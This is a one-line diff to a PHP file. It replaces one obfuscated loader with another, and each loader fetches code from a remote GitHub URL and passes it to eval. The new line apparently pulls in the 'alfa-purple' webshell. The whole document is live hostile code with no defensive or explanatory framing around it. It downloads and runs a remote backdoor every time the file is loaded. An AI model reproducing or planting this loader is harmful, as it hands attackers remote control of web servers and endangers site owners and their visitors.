@@ -1,1 +1,1 @@
-<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/GanestSeven/webshell-raw-txt/refs/heads/main/rkt.txt")))); /**/ ?>
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/234team/234team/refs/heads/main/alfa-purple.php")))); /**/ ?>
